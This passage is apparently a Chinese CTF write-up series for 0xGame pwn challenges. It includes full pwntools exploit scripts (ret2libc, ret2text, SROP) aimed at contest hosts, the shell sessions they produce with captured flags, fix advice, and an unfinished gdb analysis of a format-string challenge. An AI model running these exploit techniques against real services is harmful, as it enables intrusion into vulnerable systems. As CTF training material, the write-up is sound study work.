┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/保持沉默]
└─$ ropper -f pwn --search "pop rdi; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

[INFO] File: pwn
0x00000000004011fe: pop rdi; ret; 

                                                                   
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/保持沉默]
└─$ ropper -f pwn --search "pop rsi; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rsi; ret;

[INFO] File: pwn
0x0000000000401200: pop rsi; ret; 

                                                                   
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/保持沉默]
└─$ objdump -R pwn | grep puts
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
                                                                   
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/保持沉默]
└─$ objdump -R pwn | grep read
0000000000404038 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
                                                                   
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/保持沉默]
└─$ objdump -d pwn | grep puts
00000000004010a0 <puts@plt>:
  4010a4:       f2 ff 25 6d 2f 00 00    bnd jmp *0x2f6d(%rip)        # 404018 <puts@GLIBC_2.2.5>
  4012ac:       e8 ef fd ff ff          call   4010a0 <puts@plt>
```

```assembly
.text:000000000040126A                 public put
.text:000000000040126A put             proc near
.text:000000000040126A
.text:000000000040126A var_10          = qword ptr -10h
.text:000000000040126A var_8           = qword ptr -8
.text:000000000040126A
.text:000000000040126A ; __unwind {
.text:000000000040126A                 endbr64

.text:00000000004012EC                 public vuln
.text:00000000004012EC vuln            proc near               ; CODE XREF: main+35↓p
.text:00000000004012EC
.text:00000000004012EC buf             = byte ptr -20h
.text:00000000004012EC
.text:00000000004012EC ; __unwind {
.text:00000000004012EC                 endbr64
```

##### 3. 编写脚本

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 30343)
# r = process(["./pwn"])

# gdb.attach(r, """b *0x40134A""")

ret_elf_addr = 0x40101a

pop_rdi_ret_elf_addr = 0x4011fe
pop_rsi_ret_elf_addr = 0x401200
puts_got_elf_addr = 0x404018
read_got_elf_addr = 0x404038
puts_plt_elf_addr = 0x4010a0

put_elf_addr = 0x40126A
vuln_elf_addr = 0x4012EC

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(0xdeadbeef)
payload += p64(pop_rsi_ret_elf_addr) + p64(38183)
payload += p64(put_elf_addr)
payload += p64(vuln_elf_addr)
r.sendafter("payload:".encode(), payload)

time.sleep(2)

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(ret_elf_addr) + p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(puts_plt_elf_addr)
payload += p64(ret_elf_addr) + p64(vuln_elf_addr)
r.sendafter("payload:".encode(), payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

time.sleep(2)

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(ret_elf_addr) + p64(pop_rdi_ret_elf_addr) + p64(read_got_elf_addr) + p64(puts_plt_elf_addr)
payload += p64(ret_elf_addr) + p64(vuln_elf_addr)
r.sendafter("payload:".encode(), payload)

read_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("read_got_libc_addr", hex(read_got_libc_addr))

libc = LibcSearcher("puts", puts_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)

# libc.select_libc(0)

puts_libc_offset = libc.dump("puts")
libc_base_addr = puts_got_libc_addr - puts_libc_offset

system_libc_addr = libc_base_addr + libc.dump("system")
bin_sh_libc_addr = libc_base_addr + libc.dump("str_bin_sh")

time.sleep(2)

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(bin_sh_libc_addr) + p64(ret_elf_addr) + p64(system_libc_addr)
r.sendafter("payload:".encode(), payload)

r.interactive()
r.close()
```

```shell
[*] Switching to interactive mode
 
ls
ld-linux-x86-64.so.2
libc.so.6
pwn
ls /
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat /flag
0xGame{W0W_y0u_kn0w_7h3_R372L1bc}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{W0W_y0u_kn0w_7h3_R372L1bc}
```



### 三扇门

#### 题目介绍

> 作者 x1z1 
>
> 38 队已解出本题
>
> # 三扇门
>
> - 631分
> - 动态环境
> - Pwn
> - 中等
>
> 你的身前矗立起了三座大门。上面分别对应着各自的属性...
>
> 你手握着三把钥匙，你知道，最多试错几次你就能打开了。
>
> 可是，在你看不见的地方放着破门工具...
>
> 还跟它们废什么话，砸门就是了！

---

#### 解题过程

##### 1. 信息搜集

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/三扇门/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析**

- linux64
- 无保护

##### 2. 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}
```

```c
ssize_t vuln()
{
  _BYTE buf[16]; // [rsp+0h] [rbp-10h] BYREF

  write(1, "Welcome to ret2csu.This time , you need three keys to open the door.\n", 0x45u);
  return read(0, buf, 0x100u);
}
```

```c
int __fastcall win(int a1, int a2, int a3)
{
  if ( a1 != 273 || a2 != 546 || a3 != 819 )
    return write(1, "The key is not correct.\n", 0x18u);
  write(1, "Congratulation! You got it!\n", 0x1Cu);
  return system("/bin/sh");
}
```

**分析**

- 栈溢出
- 我们先搜集一下数据再做具体分析

##### 3. 数据搜集

```assembly
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/三扇门]
└─$ ropper -f pwn --search "ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret;

[INFO] File: pwn
0x000000000040101a: ret; 

                                                                                                                              
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/三扇门]
└─$ ropper -f pwn --search "pop" 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: pwn
0x000000000040138c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040138e: pop r13; pop r14; pop r15; ret; 
0x0000000000401390: pop r14; pop r15; ret; 
0x0000000000401392: pop r15; ret; 
0x000000000040138b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040138f: pop rbp; pop r14; pop r15; ret; 
0x000000000040117d: pop rbp; ret; 
0x0000000000401393: pop rdi; ret; 
0x0000000000401391: pop rsi; pop r15; ret; 
0x000000000040138d: pop rsp; pop r13; pop r14; pop r15; ret; 

                                                                                                                              
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/三扇门]
└─$ ropper -f pwn --search "mov"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov

[INFO] File: pwn
0x0000000000401176: mov byte ptr [rip + 0x2f2b], 1; pop rbp; ret; 
0x000000000040131c: mov eax, 0; pop rbp; ret; 
0x00000000004010fd: mov eax, 0; test rax, rax; je 0x1110; mov edi, 0x404068; jmp rax; 
0x000000000040113f: mov eax, 0; test rax, rax; je 0x1150; mov edi, 0x404068; jmp rax; 
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; 
0x0000000000401009: mov eax, dword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; add rsp, 8; ret; 
0x000000000040116f: mov ebp, esp; call 0x10f0; mov byte ptr [rip + 0x2f2b], 1; pop rbp; ret; 
0x00000000004012f3: mov edi, 0; call 0x1090; nop; leave; ret; 
0x0000000000401107: mov edi, 0x404068; jmp rax; 
0x00000000004011b7: mov edi, 1; call 0x1070; nop; leave; ret; 
0x000000000040124d: mov edi, eax; call 0x10a0; nop; pop rbp; ret; 
0x00000000004012f1: mov esi, eax; mov edi, 0; call 0x1090; nop; leave; ret; 
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; 
0x0000000000401008: mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax; add rsp, 8; ret; 
0x000000000040116e: mov rbp, rsp; call 0x10f0; mov byte ptr [rip + 0x2f2b], 1; pop rbp; ret; 
0x000000000040124c: mov rdi, rax; call 0x10a0; nop; pop rbp; ret; 
0x00000000004012f0: mov rsi, rax; mov edi, 0; call 0x1090; nop; leave; ret; 

                                                                                                                              
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/三扇门]
└─$ ropper -f pwn --search "rdx"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: rdx

                                                                                                                              
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/三扇门]
└─$ ropper -f pwn --search "edx"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: edx

                                                                                                                              
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/三扇门]
└─$ ropper -f pwn --search "dl" 
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: dl

                                                                                                                              
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/三扇门]
└─$ ropper -f pwn --search "dh"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: dh
```

```assembly
.text:0000000000401257
.text:0000000000401257 ; =============== S U B R O U T I N E =======================================
.text:0000000000401257
.text:0000000000401257 ; Attributes: bp-based frame
.text:0000000000401257
.text:0000000000401257 ; int __fastcall win(int, int, int)
.text:0000000000401257                 public win
.text:0000000000401257 win             proc near               ; DATA XREF: .data:0000000000404060↓o
.text:0000000000401257
.text:0000000000401257 var_C           = dword ptr -0Ch
.text:0000000000401257 var_8           = dword ptr -8
.text:0000000000401257 var_4           = dword ptr -4
.text:0000000000401257
.text:0000000000401257 ; __unwind {
.text:0000000000401257                 endbr64
.text:000000000040125B                 push    rbp
.text:000000000040125C                 mov     rbp, rsp
.text:000000000040125F                 sub     rsp, 10h
.text:0000000000401263                 mov     [rbp+var_4], edi
.text:0000000000401266                 mov     [rbp+var_8], esi
.text:0000000000401269                 mov     [rbp+var_C], edx
.text:000000000040126C                 cmp     [rbp+var_4], 111h
.text:0000000000401273                 jnz     short loc_4012AB
.text:0000000000401275                 cmp     [rbp+var_8], 222h
.text:000000000040127C                 jnz     short loc_4012AB
.text:000000000040127E                 cmp     [rbp+var_C], 333h
.text:0000000000401285                 jnz     short loc_4012AB
.text:0000000000401287                 mov     edx, 1Ch        ; n
.text:000000000040128C                 lea     rsi, aCongratulation ; "Congratulation! You got it!\n"
.text:0000000000401293                 mov     edi, 1          ; fd
.text:0000000000401298                 call    _write
.text:000000000040129D                 lea     rdi, command    ; "/bin/sh"
.text:00000000004012A4                 call    _system
.text:00000000004012A9                 jmp     short loc_4012C2
```

**分析**

- `ret2csu`吗？但是这题好像没有`csu`也没有可以控制`rdx`的地方吧。补充函数传参的三个寄存器分别是：`rdi、rsi、rdx`
- 我们这里直接ret到`0x40129D `就可以了

##### 4. 编写脚本

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 41784)
# r = process(["./pwn"])

# gdb.attach(r, """b *0x40134A""")

backdoor_elf_addr = 0x40129D

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(backdoor_elf_addr)
r.sendafter("door.\n".encode(), payload)

r.interactive()
r.close()
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\study\python\exp.py 
[x] Opening connection to nc1.ctfplus.cn on port 41784
[x] Opening connection to nc1.ctfplus.cn on port 41784: Trying 43.248.116.26
[+] Opening connection to nc1.ctfplus.cn on port 41784: Done
[*] Switching to interactive mode
ls
ld-2.31.so
libc-2.31.so
pwn
ls /
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat /flag
0xGame{R3t2csu_wh4t_4_mag1c_func7i0n}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{R3t2csu_wh4t_4_mag1c_func7i0n}
```

---

#### 漏洞成因

`read`函数过读造成的栈溢出

---

#### 修复意见

改成严格控制读取长度，改用`sizeof(buf)`，或改用`fgets`等边界明晰的输入函数



### 大道至简

#### 题目介绍

> 作者 x1z1 
>
> 37 队已解出本题
>
> # 大道至简
>
> - 639分
> - 动态环境
> - Pwn
> - 中等
>
> 你知道力大砖飞，你知道大道至简
>
> 但这次我不会告诉你任何信息，你的眼前只有一条路。
>
> 什么东西都涂黑了，你能做的只有去读懂藏在汇编后的深意
>
> 我说，化繁为简

---

#### 解题过程

##### 1. 信息搜集

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/大道至简/pwn'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

**分析**

- 气笑了，还真是大道至简，保护全无

##### 2. 查看源码

```c
__int64 start()
{
  signed __int64 v0; // rax
  signed __int64 v1; // rax

  v0 = sys_write(1u, &msg_welcome, 0x24u);
  vuln();
  v1 = sys_exit(0);
  return vuln();
}
```

```c
__int64 vuln()
{
  signed __int64 v0; // rax
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  v0 = sys_read(0, buf, 0x400u);
  return 0;
}
```

**分析**

- SROP (Sigreturn-Oriented Programming / 信号返回面向编程)

##### 3. 数据搜集

```shell
ropper -f pwn --search "syscall; ret;"
```

```assembly
0x0000000000401077: syscall; ret;
```

```assembly
.data:0000000000403033 binsh           db '/bin/sh',0
```

**分析**

- 没有可控的`rax`我们要继续想办法控制`rax`

##### 4. 分析汇编

```assembly
.text:0000000000401033 vuln            proc near               ; CODE XREF: _start+1E↑p
.text:0000000000401033
.text:0000000000401033 buf             = byte ptr -10h
.text:0000000000401033
.text:0000000000401033                 push    rbp
.text:0000000000401034                 mov     rbp, rsp
.text:0000000000401037                 sub     rsp, 10h
.text:000000000040103B                 mov     rax, 0
.text:0000000000401042                 mov     rdi, 0          ; fd
.text:0000000000401049                 lea     rsi, [rsp+10h+buf] ; buf
.text:000000000040104D                 mov     rdx, 400h       ; count
.text:0000000000401054                 syscall                 ; LINUX - sys_read
.text:0000000000401056                 xor     rax, rax
.text:0000000000401059                 leave
.text:000000000040105A                 retn
.text:000000000040105A vuln            endp
.text:000000000040105A
```

**分析**

- 它调用完`syscall_read`后执行了一次`xro rax, rax`此时`rax = 0`
- 我们可以在这里执行一次`syscall`调用`read`，输入`15`个字节让`rax = [rsp] = 15`，然后再次`syscall`调用`rt_sigreturn`
- 我们只需要把`payload`写入我们的`ucontext`就可以了

##### 5. 编写脚本

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

# r = process("./pwn")
r = remote("nc1.ctfplus.cn",11617)

# elf = ELF("./pwn")
# rop = ROP([elf])

# gdb.attach(r, """
# b *0x401077
# """)

bin_sh_elf_addr = 0x403033
syscall_ret_elf_addr = 0x401077

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = bin_sh_elf_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_elf_addr

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(syscall_ret_elf_addr)
payload += p64(syscall_ret_elf_addr)
payload += bytes(frame)
r.send(payload)

sleep(2)

r.send(cyclic(15))

r.interactive()
r.close()
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\study\python\exp.py 
[x] Opening connection to nc1.ctfplus.cn on port 11617
[x] Opening connection to nc1.ctfplus.cn on port 11617: Trying 43.248.116.26
[+] Opening connection to nc1.ctfplus.cn on port 11617: Done
[*] Switching to interactive mode
Welcome to the real SROP challenge.
ls
flag
pwn
cat flag
0xGame{Sr0p_c4n_m4k3_y0ur_dream_c0m3_true}
```

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{Sr0p_c4n_m4k3_y0ur_dream_c0m3_true}
```

---

#### 漏洞成因

`read`函数过读造成的栈溢出

---

#### 修复意见

改成严格控制读取长度，改用`sizeof(buf)`，或改用`fgets`等边界明晰的输入函数



### 这怎么可以作为名字啊！

#### 题目介绍

> 作者 x1z1 
>
> 34 队已解出本题
>
> # 这怎么可以作为名字啊！
>
> - 661分
> - 动态环境
> - Pwn
> - 困难
>
> "你的名字是...."
>
> "你猜，嘿嘿"
>
> 如果什么字符都可以作为"名字的话"，那我要猜到什么时候去啊！
>
> 所以发现吧，发现我留给你的信息...
>
> 它们保留，且永不逝去

---

#### 解题过程

##### 1. 信息搜集

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/这怎么可以作为名字啊！/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3f8000)
    RUNPATH:    b'/home/kali/Desktop/ctf/debug'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析**

- Linux64
- GOT表可改

##### 2. 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[24]; // [rsp+0h] [rbp-80h] BYREF
  char v5[104]; // [rsp+18h] [rbp-68h] BYREF

  init(argc, argv, envp);
  puts("What's your name?");
  read(0, buf, 0x18u);
  printf(buf);
  puts("Good name!But do you know the magic of printf?");
  puts("Tell me something you know about printf!");
  read(0, v5, 0x40u);
  printf(v5);
  puts(buf);
  puts("Oh,obviously you don't know the magic!");
  puts("Good bye");
  return 0;
}
```

**分析**

- 两次fmt
- 我们可以先写入`/bin/sh;`然后泄露`libc`相关偏移地址进而计算出`libc`基地址，修改`puts@got`为`[system@got]`进而`getshell`
- 先在`buf`处输入`/bin/sh;%i$p`，然后计算出`libc_base`，在`v5`处修改`got`表，在`puts(buf)`处触发`getshell`

##### 数据搜集

```assembly
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/这怎么可以作为名字啊！]
└─$ objdump -R pwn | grep puts  
0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
                                                                                                                                     
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/这怎么可以作为名字啊！]
└─$ readelf -s libc.so.6 | grep system
  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

```assembly
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/这怎么可以作为名字啊！]
└─$ gdb pwn
GNU gdb (Debian 16.3-5) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 215 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from pwn...
(No debugging symbols found in pwn)
------- tip of the day (disable with set show-tips off) -------
Use GDB's dprintf command to print all calls to given function. E.g. dprintf malloc, "malloc(%p)\n", (void*)$rdi will print all malloc calls
pwndbg> b *0x401242
Breakpoint 1 at 0x401242
pwndbg> start
Temporary breakpoint 2 at 0x401203
warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Temporary breakpoint 2, 0x0000000000401203 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────
 RAX  0x4011fb (main) ◂— endbr64 
 RBX  0
 RCX  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64 
 RDX  0x7fffffffdd48 —▸ 0x7fffffffe0fd ◂— 'COLORFGBG=15;0'
 RDI  1
 RSI  0x7fffffffdd38 —▸ 0x7fffffffe0bc ◂— 0x616b2f656d6f682f ('/home/ka')
 R8   0x7ffff7e1bf10 ◂— 4
 R9   0x7ffff7fc9040 ◂— endbr64 
 R10  0x7ffff7fc3908 ◂— 0xd00120000000e
 R11  0x7ffff7fde660 (_dl_audit_preinit) ◂— endbr64 
 R12  0x7fffffffdd38 —▸ 0x7fffffffe0bc ◂— 0x616b2f656d6f682f ('/home/ka')
 R13  0x4011fb (main) ◂— endbr64 
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdc20 ◂— 1
 RSP  0x7fffffffdc20 ◂— 1
 RIP  0x401203 (main+8) ◂— add rsp, -0x80
────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────
 ► 0x401203 <main+8>     add    rsp, -0x80     RSP => 0x7fffffffdba0 (0x7fffffffdc20 + -0x80)
   0x401207 <main+12>    mov    eax, 0         EAX => 0
   0x40120c <main+17>    call   init                        <init>
 
   0x401211 <main+22>    lea    rax, [rip + 0xdf0]     RAX => 0x402008 ◂— "What's your name?"
   0x401218 <main+29>    mov    rdi, rax               RDI => 0x402008 ◂— "What's your name?"
   0x40121b <main+32>    call   puts@plt                    <puts@plt>
 
   0x401220 <main+37>    lea    rax, [rbp - 0x80]
   0x401224 <main+41>    mov    edx, 0x18              EDX => 0x18
   0x401229 <main+46>    mov    rsi, rax
   0x40122c <main+49>    mov    edi, 0                 EDI => 0
   0x401231 <main+54>    call   read@plt                    <read@plt>
──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffdc20 ◂— 1
01:0008│+008     0x7fffffffdc28 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
02:0010│+010     0x7fffffffdc30 ◂— 0
03:0018│+018     0x7fffffffdc38 —▸ 0x4011fb (main) ◂— endbr64 
04:0020│+020     0x7fffffffdc40 ◂— 0x100000000
05:0028│+028     0x7fffffffdc48 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe0bc ◂— 0x616b2f656d6f682f ('/home/ka')
06:0030│+030     0x7fffffffdc50 ◂— 0
07:0038│+038     0x7fffffffdc58 ◂— 0x330bc9f75601cced
────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────
 ► 0         0x401203 main+8
   1   0x7ffff7c29d90 None
   2   0x7ffff7c29e40 __libc_start_main+128
   3         0x4010d5 _start+37
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
What's your name?
test

Breakpoint 1, 0x0000000000401242 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────
*RAX  0
 RBX  0
*RCX  0x7ffff7d14862 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x18
*RDI  0x7fffffffdba0 ◂— 0xa74736574 /* 'test\n' */
*RSI  0x7fffffffdba0 ◂— 0xa74736574 /* 'test\n' */
*R8   0x11
 R9   0x7ffff7fc9040 ◂— endbr64 
*R10  0x7ffff7c065e8 ◂— 0xf001200001a64
*R11  0x246
 R12  0x7fffffffdd38 —▸ 0x7fffffffe0bc ◂— 0x616b2f656d6f682f ('/home/ka')
 R13  0x4011fb (main) ◂— endbr64 
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64 
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdc20 ◂— 1
*RSP  0x7fffffffdba0 ◂— 0xa74736574 /* 'test\n' */
*RIP  0x401242 (main+71) ◂— call printf@plt
────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────
 ► 0x401242 <main+71>     call   printf@plt                  <printf@plt>
        format: 0x7fffffffdba0 ◂— 0xa74736574 /* 'test\n' */
        vararg: 0x7fffffffdba0 ◂— 0xa74736574 /* 'test\n' */
 
   0x401247 <main+76>     lea    rax, [rip + 0xdd2]     RAX => 0x402020 ◂— 'Good name!But do you know the magic of printf?'
   0x40124e <main+83>     mov    rdi, rax               RDI => 0x402020 ◂— 'Good name!But do you know the magic of printf?'
   0x401251 <main+86>     call   puts@plt                    <puts@plt>
 
   0x401256 <main+91>     lea    rax, [rip + 0xdf3]     RAX => 0x402050 ◂— 'Tell me something you know about printf!'
   0x40125d <main+98>     mov    rdi, rax               RDI => 0x402050 ◂— 'Tell me something you know about printf!'
   0x401260 <main+101>    call   puts@plt                    <puts@plt>
 
   0x401265 <main+106>    lea    rax, [rbp - 0x80]
   0x401269 <main+110>    add    rax, 0x18
   0x40126d <main+114>    mov    edx, 0x40              EDX => 0x40
   0x401272 <main+119>    mov    rsi, rax
──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────
00:0000│ rdi rsi rsp 0x7fffffffdba0 ◂— 0xa74736574 /* 'test\n' */
01:0008│-078         0x7fffffffdba8 ◂— 0
... ↓                6 skipped
────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────
 ► 0         0x401242 main+71
   1   0x7ffff7c29d90 None
   2   0x7ffff7c29e40 __libc_start_main+128
   3         0x4010d5 _start+37
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 20
00:0000│ rdi rsi rsp 0x7fffffffdba0 ◂— 0xa74736574 /* 'test\n' */
01:0008│-078         0x7fffffffdba8 ◂— 0
... ↓                14 skipped
10:0080│ rbp         0x7fffffffdc20 ◂— 1
11:0088│+008         0x7fffffffdc28 —▸ 0x7ffff7c29d90 ◂— mov edi, eax
12:0090│+010         0x7fffffffdc30 ◂— 0
13:0098│+018         0x7fffffffdc38 —▸ 0x4011fb (main) ◂— endbr64 
pwndbg> 
14:00a0│+020 0x7fffffffdc40 ◂— 0x100000000
15:00a8│+028 0x7fffffffdc48 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe0bc ◂— 0x616b2f656d6f682f ('/home/ka')
16:00b0│+030 0x7fffffffdc50 ◂— 0
17:00b8│+038 0x7fffffffdc58 ◂— 0x330bc9f75601cced
18:00c0│+040 0x7fffffffdc60 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe0bc ◂— 0x616b2f656d6f682f ('/home/ka')
19:00c8│+048 0x7fffffffdc68 —▸ 0x4011fb (main) ◂— endbr64 
1a:00d0│+050 0x7fffffffdc70 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64 
1b:00d8│+058 0x7fffffffdc78 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
1c:00e0│+060 0x7fffffffdc80 ◂— 0xccf43608ee63cced
1d:00e8│+068 0x7fffffffdc88 ◂— 0xccf426726c8bcced
1e:00f0│+070 0x7fffffffdc90 ◂— 0x7fff00000000
1f:00f8│+078 0x7fffffffdc98 ◂— 0
... ↓     3 skipped
23:0118│+098 0x7fffffffdcb8 ◂— 0xa71082d45c519a00
24:0120│+0a0 0x7fffffffdcc0 ◂— 0
25:0128│+0a8 0x7fffffffdcc8 —▸ 0x7ffff7c29e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159] # 重点
26:0130│+0b0 0x7fffffffdcd0 —▸ 0x7fffffffdd48 —▸ 0x7fffffffe0fd ◂— 'COLORFGBG=15;0'
27:0138│+0b8 0x7fffffffdcd8 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64 
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
          0x3f8000           0x3f9000 rw-p     1000       0 pwn
          0x3fa000           0x3fb000 rw-p     1000    2000 pwn
          0x3fc000           0x3fd000 rw-p     1000    4000 pwn
          0x3fe000           0x400000 rw-p     2000    6000 pwn
          0x400000           0x401000 r--p     1000    8000 pwn
          0x401000           0x402000 r-xp     1000    9000 pwn
          0x402000           0x403000 r--p     1000    a000 pwn
